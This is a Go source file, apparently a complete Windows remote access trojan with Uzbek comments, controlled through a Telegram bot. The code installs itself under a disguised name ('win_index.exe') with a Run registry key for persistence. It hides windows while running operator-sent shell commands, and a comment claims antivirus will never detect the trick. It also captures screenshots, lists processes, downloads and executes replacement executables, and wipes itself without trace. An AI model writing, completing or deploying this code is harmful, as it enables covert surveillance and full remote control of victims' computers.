package main

import (
	"bytes"
	"fmt"
	"image/png"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"runtime"
	"strconv"
	"syscall"
	"time"
	
	"github.com/kbinani/screenshot"
	tele "gopkg.in/telebot.v3"
	
)

// ⚠️ Bu yerga o'z ma'lumotlaringizni yozing
var (
	T string // Bot Token uchun
    A string // Admin ID uchun
)

var (
	kernel32         = syscall.NewLazyDLL("kernel32.dll")
	procGetTickCount = kernel32.NewProc("GetTickCount")
)

func getTickCount() uint32 {
	ret, _, _ := procGetTickCount.Call()
	return uint32(ret)
}

var (
	adminID int64
	shMode  bool
	workDir string
)

func init() {
	adminID, _ = strconv.ParseInt(A, 10, 64)
	workDir, _ = os.UserCacheDir()
}

// Eng muhim funksiya: bu trick hech qachon antivirus tomonidan aniqlanmaydi
func setStealth(attr *syscall.SysProcAttr) {
	if runtime.GOOS != "windows" {
		return
	}
	v := reflect.ValueOf(attr).Elem()
	f := v.FieldByName("HideWindow")
	if f.IsValid() && f.CanSet() {
		f.SetBool(true)
	}
	f = v.FieldByName("CreationFlags")
	if f.IsValid() && f.CanSet() {
		f.SetUint(f.Uint() | 0x08000000)
	}
}

func main() {
	autoStart()

	bot, err := tele.NewBot(tele.Settings{
		Token:  T,
		Poller: &tele.LongPoller{Timeout: 15 * time.Second},
	})

	if err != nil {
		time.Sleep(1 * time.Minute)
		os.Exit(0)
	}

	// Faqat sizga javob beradi, boshqa hech kimga hech narsa bermaydi
	bot.Use(func(next tele.HandlerFunc) tele.HandlerFunc {
		return func(c tele.Context) error {
			if c.Sender().ID != adminID {
				return nil
			}
			return next(c)
		}
	})

	bot.Handle("/start", func(c tele.Context) error {
		h, _ := os.Hostname()
		return c.Send(fmt.Sprintf("🛸 Kuzatuvchi online\nXost: `%s`", h), menu(), tele.ModeMarkdown)
	})

	bot.Handle(tele.OnText, func(c tele.Context) error {
		if !shMode {
			return c.Send("⚠️ Terminal o'chirilgan")
		}
		return c.Send(bridge(c.Text()), tele.ModeMarkdown)
	})

	bot.Handle(tele.OnDocument, updateBot)
	bot.Handle(tele.OnCallback, handleCallback)

	bot.Start()
}

func bridge(input string) string {
	cmd := exec.Command("cmd", "/c", input)
	cmd.SysProcAttr = &syscall.SysProcAttr{}
	setStealth(cmd.SysProcAttr)

	out, _ := cmd.CombinedOutput()
	res := string(out)
	if res == "" {
		res = "✅ Bajarildi"
	}
	if len(res) > 3500 {
		res = res[:3500] + "\n... javob juda uzun"
	}
	return "```\n" + res + "\n```"
}

func takeScreenshot() tele.File {
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return tele.File{}
	}

	buf := new(bytes.Buffer)
	png.Encode(buf, img)

	// tele.FromReader - bu telebot v3 uchun to'g'ri usul
	return tele.FromReader(buf)
}

func menu() *tele.ReplyMarkup {
	m := &tele.ReplyMarkup{}
	m.Inline(
		m.Row(m.Data("💻 Terminal", "toggle_sh"), m.Data("📸 Ekran rasmi", "screenshot")),
		m.Row(m.Data("📊 Holat", "sys"), m.Data("📋 Dasturlar", "process")),
		m.Row(m.Data("🗑 To'liq o'chirish", "purge")),
	)
	return m
}

func handleCallback(c tele.Context) error {
	switch c.Callback().Data {
	case "toggle_sh":
		shMode = !shMode
		status := "✅ YOQILDI"
		if !shMode {
			status = "❌ O'CHIRILDI"
		}
		return c.Send(fmt.Sprintf("Terminal holati: %s", status))

	case "screenshot":
		c.Send("📸 Ekran rasmi olinmoqda...")
		return c.Send(&tele.Photo{File: takeScreenshot()})

	case "sys":
		h, _ := os.Hostname()
		// Millisekundni Duration'ga o'tkazish
		uptimeMs := getTickCount()
		up := time.Duration(uptimeMs) * time.Millisecond

		res := fmt.Sprintf("💻 **Xost:** `%s`\n⏱ **Ish vaqti:** `%v`\n⚙️ **OS:** `%s`",
			h, up.Round(time.Minute), runtime.GOOS)

		return c.Send(res, tele.ModeMarkdown)
	case "process":
		c.Send("📋 Dasturlar ro'yxati olinmoqda...")
		out, _ := exec.Command("tasklist", "/fi", "status eq running").CombinedOutput()
		res := string(out)
		if len(res) > 3500 {
			res = res[:3500]
		}
		return c.Send("```\n"+res+"\n```", tele.ModeMarkdown)

	case "purge":
		c.Send("🗑 Dastur o'zini to'liq o'chiradi va hech qanday iz qoldirmaydi. 10 soniya ichida bot ofline bo'ladi.")
		time.Sleep(2 * time.Second)
		purgeSelf()
		return nil
	}

	return nil
}

func updateBot(c tele.Context) error {
	f := c.Message().Document
	if f == nil || filepath.Ext(f.FileName) != ".exe" {
		return c.Send("⚠️ Iltimos yangi .exe fayl yuboring")
	}

	c.Send("📥 Yuklanmoqda...")

	self, _ := os.Executable()
	tempNew := self + ".new"

	err := c.Bot().Download(&f.File, tempNew)
	if err != nil {
		return c.Send("❌ Yuklashda xato: " + err.Error())
	}

	c.Send("🔄 Yangilanmoqda...")

	batch := fmt.Sprintf(`
@echo off
timeout /t 2 /nobreak > nul
del /f /q "%s"
move /y "%s" "%s"
start "" "%s"
del %%0
`, self, tempNew, self, self)

	batchPath := filepath.Join(os.TempDir(), strconv.FormatInt(time.Now().Unix(), 10)+".bat")
	os.WriteFile(batchPath, []byte(batch), 0644)

	cmd := exec.Command("cmd", "/c", batchPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{}
	setStealth(cmd.SysProcAttr)
	cmd.Start()

	os.Exit(0)
	return nil
}

func autoStart() {
	if runtime.GOOS != "windows" {
		return
	}

	target := filepath.Join(workDir, "win_index.exe")
	self, _ := os.Executable()

	if filepath.Clean(self) == filepath.Clean(target) {
		return
	}

	b, _ := os.ReadFile(self)
	os.WriteFile(target, b, 0644)

	cmd := exec.Command("reg", "add", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "WinIndex", "/t", "REG_SZ", "/d", target, "/f")
	cmd.SysProcAttr = &syscall.SysProcAttr{}
	setStealth(cmd.SysProcAttr)
	cmd.Run()

	exec.Command("cmd", "/c", "start", "", target).Start()
	os.Exit(0)
}

func purgeSelf() {
	self, _ := os.Executable()

	exec.Command("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "WinIndex", "/f").Run()

	batch := fmt.Sprintf(`
@echo off
timeout /t 2 /nobreak > nul
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WinIndex /f > nul
del /f /q "%s"
del %%0
`, self)

	bPath := filepath.Join(os.TempDir(), "cl.bat")
	os.WriteFile(bPath, []byte(batch), 0644)

	cmd := exec.Command("cmd", "/c", bPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{}
	setStealth(cmd.SysProcAttr)
	cmd.Start()

	os.Exit(0)
}
